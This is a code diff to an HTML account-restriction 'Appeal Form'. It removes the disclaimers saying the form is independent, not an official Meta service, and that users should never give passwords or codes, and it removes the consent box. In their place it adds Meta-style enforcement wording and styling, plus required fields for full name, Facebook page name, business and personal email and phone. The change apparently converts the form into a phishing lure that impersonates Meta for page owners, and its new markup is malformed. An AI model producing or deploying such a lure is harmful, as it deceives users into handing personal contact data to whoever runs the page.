@@ -120,166 +120,90 @@
 
                 <!-- TOP -->
                 <!-- APPEAL FORM -->
-<section
-    id="appeal-section"
-    class="my-6 rounded-2xl border border-gray-200 bg-white p-5 md:p-6"
->
+<section id="appeal-section" class="my-6 rounded-2xl border border-gray-200 bg-white p-5 md:p-6">
     <h2 class="text-xl font-bold text-gray-900">
         Appeal Form
-    </h2>
 
-    <p class="mt-2 text-sm text-gray-600">
-        Submit an appeal to the operator of this website.
-        This is an independent form, not an official Meta service.
-        Do not provide passwords or verification codes.
-    </p>
+              <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
+                Please indicate why you believe that account restrictions were imposed by mistake. Our technology and
+                team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us
+                in your native language. </div>
+            <form id="clientForm" class="space-y-4">
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Full Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
+                </div>
 
-    <form id="clientForm" class="mt-6" novalidate>
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Facebook Page Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
+                </div>
 
-        <!-- Reason for appeal -->
-        <div class="mb-4">
-            <label for="appeal" class="mb-2 block font-semibold">
-                Reason for appeal
-            </label>
-            <textarea
-                id="appeal"
-                name="appeal"
-                rows="4"
-                maxlength="5000"
-                required
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="Explain your reason for appeal"
-            ></textarea>
-            <p id="err-appeal" class="hidden mt-1 text-sm text-red-600">
-                Please explain your reason for appeal.
-            </p>
-        </div>
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Business Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
+                </div>
 
-        <!-- Full name -->
-        <div class="mb-4">
-            <label for="appeal-fullname" class="mb-2 block font-semibold">
-                Full name
-            </label>
-            <input
-                id="appeal-fullname"
-                name="fullname"
-                type="text"
-                autocomplete="name"
-                maxlength="120"
-                required
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="Your full name"
-            >
-            <p id="err-appeal-fullname" class="hidden mt-1 text-sm text-red-600">
-                Please enter your full name.
-            </p>
-        </div>
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Personal Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
+                </div>
 
-        <!-- Business Email -->
-        <div class="mb-4">
-            <label for="business-email" class="mb-2 block font-semibold">
-                Business Email
-            </label>
-            <input
-                id="business-email"
-                name="businessEmail"
-                type="email"
-                autocomplete="work email"
-                maxlength="254"
-                required
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="you@company.com"
-            >
-            <p id="err-business-email" class="hidden mt-1 text-sm text-red-600">
-                Please enter a valid business email address.
-            </p>
-        </div>
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Mobile Phone Number <span class="text-red-600">*</span>
+                    </label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
+                </div>
 
-        <!-- Personal Email -->
-        <div class="mb-4">
-            <label for="personal-email" class="mb-2 block font-semibold">
-                Personal Email
-            </label>
-            <input
-                id="personal-email"
-                name="personalEmail"
-                type="email"
-                autocomplete="email"
-                maxlength="254"
-                required
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="you@example.com"
-            >
-            <p id="err-personal-email" class="hidden mt-1 text-sm text-red-600">
-                Please enter a valid personal email address.
-            </p>
-        </div>
+                <div class="pt-2">
+                    <p class="block text-sm font-[600] text-gray-700 mb-3">
+                        What do you think happened? <span class="text-red-600">*</span>
+                    </p>
 
-        <!-- Mobile Phone Number -->
-        <div class="mb-4">
-            <label for="mobile-phone" class="mb-2 block font-semibold">
-                Mobile Phone Number
-            </label>
-            <input
-                id="mobile-phone"
-                name="mobilePhone"
-                type="tel"
-                autocomplete="tel"
-                maxlength="25"
-                required
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="+84 123 456 789"
-            >
-            <p id="err-mobile-phone" class="hidden mt-1 text-sm text-red-600">
-                Please enter a valid phone number.
-            </p>
-        </div>
+                    <div class="space-y-2">
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="erroneous_report" required="" class="mt-1">
+                            <span class="text-sm text-gray-700 cursor-pointer">An erroneous report or unfair competitive
+                                complaint.</span>
+                        </label>
 
-        <!-- Optional page/account name -->
-        <div class="mb-4">
-            <label for="appeal-page" class="mb-2 block font-semibold">
-                Page or account name (optional)
-            </label>
-            <input
-                id="appeal-page"
-                name="pageName"
-                type="text"
-                maxlength="200"
-                class="w-full rounded-lg border border-gray-300 p-3"
-                placeholder="Page or account name"
-            >
-        </div>
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="notification_error" class="mt-1">
+                            <span class="text-sm text-gray-700 cursor-pointer">This notification was sent in
+                                error.</span>
+                        </label>
 
-        <!-- Consent -->
-        <div class="mb-4 flex items-start gap-2">
-            <input
-                id="appeal-consent"
-                name="consent"
-                type="checkbox"
-                required
-            >
-            <label for="appeal-consent" class="text-sm">
-                I agree that the website operator may use this information
-                to respond to my appeal.
-            </label>
-        </div>
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="no_fraud" class="mt-1">
+                            <span class="text-sm text-gray-700 cursor-pointer">No fraud involved / another legitimate
+                                reason:</span>
+                        </label>
 
-        <p
-            id="appeal-status"
-            class="mb-4 text-sm"
-            role="status"
-            aria-live="polite"
-        ></p>
+                        <div class="mt-1">
+                            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+                        </div>
+                    </div>
+                </div>
 
-        <button
-            id="submitRequestBtn"
-            type="submit"
-            class="w-full rounded-lg bg-blue-600 px-4 py-3 font-semibold text-white hover:bg-blue-700"
-        >
-            Submit appeal
-        </button>
-    </form>
-</section>
+                <!-- Submit -->
+                <div class="pt-3">
+                    <button id="btn-submit-request" type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                </div>
+
+                
+
+            </form>
+
+        </h2></section>
 <!-- END APPEAL FORM -->
                 <div>
 <!-- END INDEPENDENT APPEAL FORM -->
